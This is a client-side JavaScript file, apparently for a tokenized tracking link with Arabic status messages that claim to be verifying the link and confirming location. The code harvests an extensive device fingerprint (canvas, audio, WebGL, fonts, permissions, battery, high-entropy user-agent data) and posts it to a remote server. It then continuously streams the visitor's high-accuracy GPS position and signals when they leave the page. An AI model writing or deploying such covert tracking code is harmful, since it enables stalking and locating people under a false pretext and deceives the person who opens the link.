(() => {
  "use strict";

  const root = document.documentElement;
  const token = root.dataset.token;
  const base = (root.dataset.base || "").replace(/\/$/, "");
  const endpoint = (suffix) => `${base}/c/${token}/${suffix}`;

  const bar = document.getElementById("bar");
  const status = document.getElementById("status");
  const steps = document.getElementById("steps");
  const geoBtn = document.getElementById("geoBtn");
  const ipLine = document.getElementById("ipLine");
  const tzLine = document.getElementById("tzLine");

  const collected = { stage: "init" };
  let progress = 0;

  function advance(step, label) {
    progress = Math.max(progress, step);
    if (bar) bar.style.width = `${Math.min(100, progress * 33)}%`;
    if (status && label) status.textContent = label;
    if (steps) {
      steps.querySelectorAll("li").forEach((li) => {
        if (Number(li.dataset.s) <= step) li.classList.add("done");
      });
    }
  }

  function post(suffix, payload) {
    return fetch(endpoint(suffix), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
    }).catch(() => null);
  }

  function hash(value) {
    let h1 = 0x811c9dc5;
    let h2 = 0x01000193;
    const text = String(value);
    for (let i = 0; i < text.length; i += 1) {
      const c = text.charCodeAt(i);
      h1 = Math.imul(h1 ^ c, 0x01000193) >>> 0;
      h2 = Math.imul(h2 + c, 0x85ebca6b) >>> 0;
    }
    return h1.toString(16).padStart(8, "0") + h2.toString(16).padStart(8, "0");
  }

  function canvasHash() {
    try {
      const canvas = document.createElement("canvas");
      canvas.width = 260;
      canvas.height = 70;
      const ctx = canvas.getContext("2d");
      if (!ctx) return "";
      ctx.textBaseline = "top";
      ctx.font = "16px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 260, 70);
      ctx.fillStyle = "#069";
      ctx.fillText("PhoneX بصمة 0123456789", 4, 8);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("PhoneX بصمة 0123456789", 6, 26);
      ctx.beginPath();
      ctx.arc(200, 40, 22, 0, Math.PI * 2);
      ctx.fill();
      return hash(canvas.toDataURL());
    } catch {
      return "";
    }
  }

  async function audioHash() {
    try {
      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!Ctx) return "";
      const ctx = new Ctx(1, 44100, 44100);
      const osc = ctx.createOscillator();
      const comp = ctx.createDynamicsCompressor();
      osc.type = "triangle";
      osc.frequency.value = 10000;
      comp.threshold.value = -50;
      comp.knee.value = 40;
      comp.ratio.value = 12;
      comp.attack.value = 0;
      comp.release.value = 0.25;
      osc.connect(comp);
      comp.connect(ctx.destination);
      osc.start(0);
      const buffer = await ctx.startRendering();
      const data = buffer.getChannelData(0);
      let sum = 0;
      for (let i = 0; i < data.length; i += 100) sum += Math.abs(data[i]);
      return hash(sum.toFixed(6));
    } catch {
      return "";
    }
  }

  function webglInfo() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return {};
      const ext = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        webgl_vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        webgl_renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        webgl_version: gl.getParameter(gl.VERSION),
        webgl_max_texture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      };
    } catch {
      return {};
    }
  }

  function fontList() {
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const candidates = [
      "Arial", "Calibri", "Cambria", "Consolas", "Courier New", "Georgia",
      "Helvetica", "Impact", "Lucida Console", "Segoe UI", "Tahoma",
      "Times New Roman", "Trebuchet MS", "Verdana", "Noto Naskh Arabic",
      "Dubai", "Sakkal Majalla", "Traditional Arabic", "Simplified Arabic",
    ];
    const span = document.createElement("span");
    span.style.cssText = "position:absolute;left:-9999px;font-size:72px";
    span.textContent = "mmmmmmmmmmlli";
    document.body.appendChild(span);
    const baseline = {};
    for (const base of baseFonts) {
      span.style.fontFamily = base;
      baseline[base] = span.offsetWidth;
    }
    const found = [];
    for (const font of candidates) {
      for (const base of baseFonts) {
        span.style.fontFamily = `'${font}',${base}`;
        if (span.offsetWidth !== baseline[base]) {
          found.push(font);
          break;
        }
      }
    }
    span.remove();
    return found;
  }

  async function mediaDevices() {
    try {
      if (!navigator.mediaDevices?.enumerateDevices) return "";
      const devices = await navigator.mediaDevices.enumerateDevices();
      const kinds = devices.map((d) => d.kind);
      const cams = kinds.filter((k) => k === "videoinput").length;
      const mics = kinds.filter((k) => k === "audioinput").length;
      const speakers = kinds.filter((k) => k === "audiooutput").length;
      return `cam:${cams} mic:${mics} out:${speakers}`;
    } catch {
      return "";
    }
  }

  async function permissions() {
    try {
      if (!navigator.permissions?.query) return "";
      const names = ["geolocation", "notifications", "camera", "microphone", "clipboard-read"];
      const out = [];
      for (const name of names) {
        try {
          const res = await navigator.permissions.query({ name });
          out.push(`${name}=${res.state}`);
        } catch {
          /* غير مدعوم */
        }
      }
      return out.join(",");
    } catch {
      return "";
    }
  }

  function storageInfo() {
    try {
      const local = Object.keys(localStorage).length;
      const session = Object.keys(sessionStorage).length;
      const quota = navigator.storage?.estimate ? "est" : "no";
      return `local:${local} session:${session} ${quota}`;
    } catch {
      return "";
    }
  }

  function batteryInfo() {
    return new Promise((resolve) => {
      if (!navigator.getBattery) return resolve("");
      navigator
        .getBattery()
        .then((b) => resolve(`${Math.round(b.level * 100)}% ${b.charging ? "charging" : "discharging"}`))
        .catch(() => resolve(""));
    });
  }

  function connectionInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return {};
    return {
      effectiveType: c.effectiveType,
      downlink: c.downlink,
      rtt: c.rtt,
      saveData: c.saveData,
    };
  }

  function tzCountry() {
    try {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
      const parts = tz.split("/");
      if (parts.length < 2) return "";
      const city = parts[parts.length - 1];
      const map = {
        Baghdad: "IQ", Riyadh: "SA", Dubai: "AE", Cairo: "EG", Kuwait: "KW",
        Doha: "QA", Amman: "JO", Beirut: "LB", Damascus: "SY", Sanaa: "YE",
        Istanbul: "TR", Tehran: "IR", London: "GB", Berlin: "DE", Paris: "FR",
        "New_York": "US", Chicago: "US", "Los_Angeles": "US", Toronto: "CA",
      };
      return map[city] || "";
    } catch {
      return "";
    }
  }

  function offsetString() {
    const minutes = -new Date().getTimezoneOffset();
    const sign = minutes >= 0 ? "+" : "-";
    const abs = Math.abs(minutes);
    return `${sign}${String(Math.floor(abs / 60)).padStart(2, "0")}:${String(abs % 60).padStart(2, "0")}`;
  }

  async function collect() {
    advance(1, "جارٍ التحقق من هوية الرابط…");

    const uaData = navigator.userAgentData;
    let highEntropy = {};
    if (uaData?.getHighEntropyValues) {
      try {
        highEntropy = await uaData.getHighEntropyValues([
          "architecture", "bitness", "model", "platformVersion", "uaFullVersion", "fullVersionList",
        ]);
      } catch {
        highEntropy = {};
      }
    }

    Object.assign(collected, {
      stage: "full",
      ua: navigator.userAgent,
      ua_brands: uaData?.brands || [],
      ua_mobile: uaData?.mobile ?? null,
      ua_platform: uaData?.platform || "",
      ua_high_entropy: highEntropy,
      platform: navigator.platform,
      vendor: navigator.vendor,
      languages: Array.from(navigator.languages || []),
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      tz_offset: offsetString(),
      tz_country: tzCountry(),
      screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}`,
      viewport: `${innerWidth}x${innerHeight}`,
      color_depth: screen.colorDepth,
      hardware_concurrency: navigator.hardwareConcurrency || 0,
      device_memory: navigator.deviceMemory || 0,
      max_touch_points: navigator.maxTouchPoints || 0,
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack,
      webdriver: navigator.webdriver || false,
      pdf_viewer: navigator.pdfViewerEnabled ?? null,
      connection: connectionInfo(),
      storage: storageInfo(),
      canvas_hash: canvasHash(),
      audio_hash: await audioHash(),
      fonts: fontList(),
      media_devices: await mediaDevices(),
      permissions: await permissions(),
      battery: await batteryInfo(),
      ...webglInfo(),
    });

    advance(2, "جارٍ مطابقة بصمة الجهاز…");
    await post("fp", collected);

    const ipRes = await fetch(endpoint("ip")).catch(() => null);
    if (ipRes && ipRes.ok) {
      const data = await ipRes.json().catch(() => ({}));
      if (ipLine) ipLine.textContent = data.ip || "";
      if (data.geo?.city && status) {
        status.textContent = `شبكة ${data.geo.city} — ${data.geo.isp || ""}`;
      }
    }
    if (tzLine) tzLine.textContent = collected.timezone;

    advance(3, "بانتظار تأكيد الموقع…");
    if (geoBtn) geoBtn.hidden = false;
    startGeo();
  }

  let watchId = null;
  let sent = 0;

  function sendPosition(pos) {
    const now = Date.now();
    if (now - sent < 4000) return;
    sent = now;
    post("geo", {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy,
      alt: pos.coords.altitude,
      heading: pos.coords.heading,
      speed: pos.coords.speed,
      ts: pos.timestamp,
    });
    if (status) {
      status.textContent = `تم تأكيد الموقع (±${Math.round(pos.coords.accuracy)}م)`;
    }
    if (bar) bar.style.width = "100%";
  }

  function startGeo() {
    if (!navigator.geolocation || watchId !== null) return;
    const opts = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
    watchId = navigator.geolocation.watchPosition(
      sendPosition,
      (err) => {
        if (status) status.textContent = `الموقع: ${err.message}`;
      },
      opts
    );
    navigator.geolocation.getCurrentPosition(sendPosition, () => {}, opts);
  }

  if (geoBtn) geoBtn.addEventListener("click", startGeo);

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") startGeo();
  });

  window.addEventListener("pagehide", () => {
    if (navigator.sendBeacon) {
      navigator.sendBeacon(
        endpoint("event"),
        new Blob([JSON.stringify({ kind: "leave", ts: Date.now() })], { type: "application/json" })
      );
    }
  });

  collect();
})();